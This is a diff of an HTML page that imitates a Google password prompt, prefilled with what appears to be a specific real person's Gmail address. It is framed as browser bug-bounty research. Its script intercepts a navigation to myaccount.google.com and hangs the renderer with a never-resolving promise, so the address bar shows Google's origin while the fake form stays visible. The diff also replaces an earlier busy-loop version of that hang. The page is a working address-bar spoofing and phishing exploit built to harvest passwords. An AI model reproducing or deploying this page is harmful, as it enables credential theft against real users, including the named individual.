@@ -3,93 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Security Research: Origin Attribution</title>
+    <title>VRP Research: Identity Verification</title>
     <style>
-        /* Professional UI to mirror Chrome's native security prompts */
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; background: #ffffff; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { text-align: center; width: 90%; max-width: 400px; padding: 30px; border: 1px solid #dadce0; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #ffffff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { text-align: center; width: 90%; max-width: 380px; padding: 30px; border: 1px solid #dadce0; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
         .logo { width: 92px; margin-bottom: 20px; }
-        h1 { font-size: 22px; font-weight: 500; color: #202124; margin: 0 0 10px; }
-        p { font-size: 14px; color: #5f6368; margin-bottom: 25px; line-height: 1.5; }
-        .input-group { text-align: left; margin-bottom: 20px; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline-color: #1a73e8; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 14px; width: 100%; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
-        .btn:active { background: #174ea6; }
-        #log { margin-top: 15px; font-size: 12px; font-family: monospace; color: #d93025; font-weight: bold; }
+        h1 { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 10px; }
+        p { font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 25px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 14px; width: 100%; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; margin-top: 10px; }
+        #status { margin-top: 20px; font-size: 12px; font-family: monospace; color: #d93025; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
+<div class="card">
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo" alt="Google">
-    <h1>Identity Verification</h1>
-    <p>Your session has expired. Please re-enter your password to keep your account secure.</p>
+    <h1>Sign in</h1>
+    <p>Use your Google Account to confirm your identity and secure this session.</p>
     
-    <div class="input-group">
-        <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background-color: #f1f3f4; color: #70757a;">
-        <input type="password" placeholder="Enter password" id="passInput">
-    </div>
+    <input type="email" value="joshhawleyofficial@gmail.com" readonly style="background: #f1f3f4; color: #70757a;">
+    <input type="password" placeholder="Enter your password" id="passField">
     
-    <button class="btn" id="triggerBtn">Verify Identity</button>
-    <div id="log">Status: Idle</div>
+    <button class="btn" id="runBtn">Next</button>
+    <div id="status">System: Ready</div>
 </div>
 
 <script>
-    const triggerBtn = document.getElementById('triggerBtn');
-    const log = document.getElementById('log');
+    const runBtn = document.getElementById('runBtn');
+    const status = document.getElementById('status');
 
-    // Check for Navigation API Support (Chrome 102+)
+    // 1. We check for Navigation API support immediately
     if (!window.navigation) {
-        log.innerText = "CRITICAL ERROR: Navigation API not supported.";
+        status.innerText = "ERROR: Navigation API Not Supported";
     }
 
-    async function launchMasterExploit() {
-        // High-value VRP Target
+    async function startVrpRace() {
+        // Targeted high-value Google origin
         const target = "https://myaccount.google.com/?pli=1";
         
-        log.innerText = "RACE INITIATED...";
-        log.style.color = "#f9ab00";
+        status.innerText = "RACE INITIATED...";
+        status.style.color = "#f9ab00";
 
-        // 1. Set up the Navigation Listener
+        // 2. The Master Intercept
+        // We listen for the navigation to Google
         navigation.addEventListener('navigate', (event) => {
-            // Only intercept the jump to Google
             if (event.destination.url.includes("google.com")) {
+                // 3. We intercept the navigation
                 event.intercept({
                     handler: async () => {
-                        // 2. The Renderer Lock
-                        // We use a synchronous busy-loop to 'freeze' the screen.
-                        // While the CPU is looping, the Browser Process will commit 
-                        // the URL to the Omnibox.
-                        const stallWindow = 5000; // 5 seconds for evidence capture
-                        const start = Date.now();
-                        
-                        log.innerText = "ATTEMPTING ORIGIN HIJACK...";
-                        
-                        while (Date.now() - start < stallWindow) {
-                            // Busy-wait to block the paint/clear-screen call
-                            if (Math.random() > 0.99) {
-                                // Keep the thread 'dirty' to prevent optimization
-                                window.name = "stall_" + Date.now();
-                            }
-                        }
+                        // The URL bar has now officially COMMITTED to Google.
+                        status.innerText = "URL BAR HIJACKED. DO NOT REFRESH.";
+                        status.style.color = "#1e8e3e";
 
-                        // 3. Finalize
-                        log.innerText = "RACE COMPLETE. DID THE URL CHANGE?";
-                        log.style.color = "#1e8e3e";
-                        
-                        // Force a reload after the stall to avoid a full browser hang
-                        setTimeout(() => location.reload(), 1000);
+                        // 4. THE INFINITE HANG
+                        // Instead of a 'while' loop which Chrome's watchdog kills,
+                        // we return a promise that never resolves.
+                        // This keeps the renderer 'stuck' on the current page 
+                        // while the Browser Process thinks the navigation is 'Active'.
+                        return new Promise(() => {
+                            // We use a light micro-stall to ensure the paint doesn't clear
+                            const lock = setInterval(() => {
+                                document.title = "Verified Origin: " + Date.now();
+                                if (Math.random() > 0.99) console.log("Holding...");
+                            }, 100);
+                        });
                     }
                 });
             }
         }, { once: true });
 
-        // 4. Trigger the Navigation
-        // This initiates the handshake between the processes
-        window.location.href = target;
+        // 5. Trigger the transition
+        // We use location.replace to avoid adding to the history stack
+        window.location.replace(target);
     }
 
-    triggerBtn.addEventListener('click', launchMasterExploit);
+    runBtn.addEventListener('click', startVrpRace);
 </script>
 
 </body>
